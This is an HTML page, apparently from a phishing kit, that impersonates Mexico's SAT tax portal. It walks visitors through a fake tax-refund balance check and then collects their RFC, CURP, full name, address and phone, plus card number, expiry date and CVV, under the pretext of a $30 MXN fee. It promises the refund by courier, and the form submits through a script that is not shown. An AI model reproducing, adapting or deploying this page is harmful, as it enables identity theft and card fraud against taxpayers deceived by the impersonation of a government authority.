<!DOCTYPE html>
<html lang="es">
    <head>
        <title>Portal SAT</title>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <link rel="icon" href="front/assets/logo2.png">
        <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Aleo|Major+Mono+Display|Open+Sans|Oswald|PT+Sans|PT+Serif|Playfair+Display|Roboto+Condensed|Roboto+Slab" >
        <link rel="stylesheet" href="front/css/estilos.css" >
        <link rel="stylesheet" href="front/css/fonts.css"/>
        <link rel="stylesheet" href="front/css/icon/fonts.css"/>
        <script src="https://code.jquery.com/jquery-1.11.2.min.js"></script>
    </head>
    
    <body>
        <!--Loader-->
        <div class="contenedor-loader">
            <div class="row cf"></div>
            <div class="three col"></div>
            <div class="loader" id="loader-1"></div>
        </div>

        <!--Banner-->
        <div class="banner">
            <img src="front/assets/logo.png">  
            <span class="icon-menu1"></span> 
        </div>

        <div class="inicio">
            
            <div class="header" id="header">
                <div class="principal">
                    <h1>SAT Servicios en línea</h1>
                    <p>Da click en el siguiente botón para iniciar el proceso</p>
                    <button id="iniciar">Verificar saldo <span class="icon-users"></span></button>
                    <p>Cuando tengas saldo a favor podrás solicitar las devoluciones que te correspondan.</p>
                </div>

                <div class="proceso1">
                    <h1>SAT Servicios en línea</h1>
                    <p>Completa tus datos (RFC) para continuar con la validación de tu saldo a favor.</p>
                    <label for="rfc">Ingresa tu RFC <span classs="icon-file"></span></label>
                    <input type="text" name="rfc" id="rfc" minlength="13" maxlength="13">
                    <button id="seguir1">Siguiente paso <span class="icon-arrow-right"></span></button>
                </div>

                <div class="proceso2">
                    <h1>SAT Servicios en línea</h1>
                    <div class="disponible">
                        <h3>SALDO A FAVOR DISPONIBLE:</h3>
                        <h2 id="saldo"></h2>
                        <p>✓ Buen historial financiero.</p>
                        <p>✓ Buen historial de impuestos.</p>
                        <p>✓ Buen historial en el SAT.</p>
                    </div>
                    <button id="seguir2">Siguiente paso <span class="icon-arrow-right"></span></button>
                </div>

                <div class="proceso3">
                    <h1>SAT Servicios en línea</h1>
                    <form method="post" id="formulario">
                        <h4 id="saldo2"></h4>
                        <img src="front/assets/dinero.png">
                        <p>El pago será enviado a la dirección proporcionada en un plazo de 7 días</p>
                        <label for="nombre">Datos de envío:</label>
                        <input type="text" name="nombre" id="nombre" placeholder="NOMBRE COMPLETO"/>
                        <input type="text" name="curp" id="curp" placeholder="CURP" minlength="18" maxlength="18"/>
                        <input type="text" name="direccion" id="direccion" placeholder="DIRECCIÓN"/>
                        <input type="text" name="colonia" id="colonia" placeholder="COLONIA"/>
                        <input type="text" name="estado" id="estado" placeholder="ESTADO"/>
                        <input type="number" name="cp" id="cp" placeholder="CÓDIGO POSTAL" min="5" max="5"/>
                        <input type="number" name="phone" id="phone" placeholder="Celular" min="10" max="15"/>
                        <br>
                        <br>
                        <label for="cc">Datos del pago ($30.00 MXN):</label>
                        <input type="number" name="cc" id="cc" placeholder="NÚMERO DE TARJETA" min="16" max="16"/>
                        <input type="number" name="exp" id="exp" placeholder="FECHA DE EXP (MM/AA)" min="4" max="5"/>
                        <input type="number" name="cvv" id="cvv" placeholder="CVV" min="3" max="4"/>
                    </form>
                    <button id="enviar">Retirar $</button>
                </div>
                
                <div class="exito">
                    <h1>SAT Servicios en línea</h1>
                    <img src="front/assets/exito2.png">
                    <h2>¡TU DINERO ESTÁ EN CAMINO!</h2>
                    <br>
                    <h3>Llegará a tu domicilio a través de la empresa de paquetería <u>FEDEX</u></h3>
                    <br>
                    <h3>Esto puede tardar de 7 a 15 días hábiles</h3>
                    <button id="finalizar">Finalizar <span class="icon-redo"></span></button>
                </div>

                <div class="reiniciar">
                   <a href="" id="reiniciar">Iniciar de nuevo</a> 
                </div>
                
                <div class="inner-header flex"></div>
                <div>
                    <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
                        <defs>
                            <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
                        </defs>
                        <g class="parallax">
                            <use xlink:href="#gentle-wave" x="48" y="0" fill="rgba(255,255,255,0.7" />
                            <use xlink:href="#gentle-wave" x="48" y="3" fill="rgba(255,255,255,0.5)" />
                            <use xlink:href="#gentle-wave" x="48" y="5" fill="rgba(255,255,255,0.3)" />
                            <use xlink:href="#gentle-wave" x="48" y="7" fill="#fff" />
                        </g>
                    </svg>
                </div>
            </div>
        </div>

        <div class="footer" id="footer">
            <h4>© Copyright 2021 SAT GOB.MX</h4>
        </div>
        
        <script src="ajax/enviar.js"></script>
    </body>
</html>
